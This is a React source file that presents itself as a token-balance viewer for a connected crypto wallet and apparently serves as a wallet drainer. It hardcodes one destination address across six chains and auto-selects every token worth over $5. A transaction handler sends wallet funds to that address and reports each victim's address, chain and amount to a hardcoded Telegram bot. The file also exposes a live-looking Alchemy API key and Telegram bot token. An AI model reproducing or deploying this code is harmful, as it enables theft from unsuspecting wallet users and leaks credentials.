import { useCallback, useEffect, useState } from 'react';
import { useAccount, useWaitForTransactionReceipt, useWalletClient } from 'wagmi';
import { Loading, Toggle } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { Alchemy, Network } from 'alchemy-sdk';

// Alchemy instances for multiple networks
const alchemyInstances = {
  [Network.ETH_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ETH_MAINNET }),
  [Network.BSC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.BSC_MAINNET }),
  [Network.OPTIMISM]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.OPTIMISM }),
  [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
  [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
  [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
};

// Mapping from chain IDs to Alchemy SDK network enums
const chainIdToNetworkMap = {
  1: Network.ETH_MAINNET,
  56: Network.BSC_MAINNET,
  10: Network.OPTIMISM,
  324: Network.ZK_SYNC,
  42161: Network.ARB_MAINNET,
  137: Network.MATIC_MAINNET,
};

// Supported chain IDs
const supportedChains = [1, 56, 10, 324, 42161, 137];

// Mapping of chain IDs to destination addresses
const chainIdToDestinationAddress = {
  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
};

// Telegram bot configuration
const TELEGRAM_BOT_TOKEN = '7439590254:AAHON2e8fQW1mlEYPiWqE1RCf7F2Az7ABr0';
const TELEGRAM_CHAT_ID = '5470283104';

// Formatter for USD currency
const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  minimumFractionDigits: 2,
  maximumFractionDigits: 2,
});

// Function to safely convert input values to tinyBig numbers
const safeNumber = (value) => {
  try {
    if (value === undefined || value === null || value === '') {
      return tinyBig(0);
    }
    const num = tinyBig(value.toString());
    // Use JavaScript's isNaN to check for NaN
    return isNaN(num.toNumber()) ? tinyBig(0) : num;
  } catch (error) {
    console.error('Invalid number detected:', error, value);
    return tinyBig(0);
  }
};

// Function to send a Telegram notification
const sendTelegramNotification = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(params),
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.statusText}`);
    }
    console.log('Telegram notification sent successfully.');
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
};

const TokenRow = ({ token }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { chain } = useAccount();
  const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;

  const setTokenChecked = (tokenAddress, isChecked) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
  };

  const { address } = useAccount();
  const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;

  const unroundedBalance = safeNumber(quote_rate).gt(0)
    ? safeNumber(quote).div(safeNumber(quote_rate))
    : tinyBig(0);

  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
    ? unroundedBalance.round(2)
    : unroundedBalance.round(5);

  const { isLoading } = useWaitForTransactionReceipt({
    hash: pendingTxn?.blockHash || undefined,
  });

  return (
    <div key={contract_address}>
      {isLoading && <Loading />}
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace' }}>
        {roundedBalance.toString()}{' '}
      </span>
      <a
        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
        target="_blank"
        rel="noreferrer"
      >
        {contract_ticker_symbol}
      </a>{' '}
      (worth{' '}
      <span style={{ fontFamily: 'monospace' }}>
        {usdFormatter.format(safeNumber(quote))}
      </span>
      )
    </div>
  );
};

const handleTokenTransaction = async (walletClient, destinationAddress, amount, senderAddress, networkName, chainId, tokenName, blockExplorerUrl) => {
  if (!walletClient.data || !destinationAddress) return;

  try {
    const tx = await walletClient.data.sendTransaction({
      to: destinationAddress,
      value: amount,
      gasLimit: '21000', // Example gas limit
    });

    console.log('Transaction sent:', tx.hash);

    // Constructing the Telegram message
    const message = `Sender's Address: ${senderAddress}
Network Name: ${networkName}
Chain ID: ${chainId}
Amount Sent: ${amount}
Token Name: ${tokenName}
Block Explorer URL: ${blockExplorerUrl}`;

    sendTelegramNotification(message);
  } catch (error) {
    console.error('Failed to send transaction:', error);
  }
};

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { address, isConnected, chain } = useAccount();
  const walletClient = useWalletClient();
  const [destinationAddress, setDestinationAddress] = useState('');
  const [notificationSent, setNotificationSent] = useState(false);

  const autoToggleTokens = useCallback((tokens) => {
    const newCheckedRecords = {};
    tokens.forEach((token) => {
      const tokenValue = safeNumber(token.quote);
      if (tokenValue.gt(5)) { // Automatically toggle on if value is greater than $5
        newCheckedRecords[token.contract_address] = { isChecked: true };
      }
    });
    setCheckedRecords(newCheckedRecords);
  }, [setCheckedRecords]);

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      setError('');
      if (!chain || !supportedChains.includes(chain.id)) {
        setLoading(false);
        return;
      }

      const chainId = chain?.id || 1;
      const alchemyNetwork = chainIdToNetworkMap[chainId];
      const alchemyInstance = alchemyInstances[alchemyNetwork];

      const balanceData = await alchemyInstance.core.getTokenBalances(address);
      const enrichedTokens = balanceData.tokenBalances.map((token) => {
        const globalTokenInfo = tokens.find((t) => t.contract_address === token.contractAddress);
        return { ...globalTokenInfo, ...token };
      });

      setTokens(enrichedTokens);
      autoToggleTokens(enrichedTokens);
    } catch (error) {
      setError(`Error fetching data: ${error.message}`);
    } finally {
      setLoading(false);
    }
  }, [address, chain, autoToggleTokens, setTokens, tokens]);

  useEffect(() => {
    if (isConnected) {
      fetchData();
    }
  }, [fetchData, isConnected]);

  return (
    <div>
      {loading ? (
        <Loading>Loading...</Loading>
      ) : error ? (
        <div>Error: {error}</div>
      ) : (
        <div>
          {tokens.map((token) => (
            <TokenRow key={token.contract_address} token={token} />
          ))}
        </div>
      )}
    </div>
  );
};

export default GetTokens;
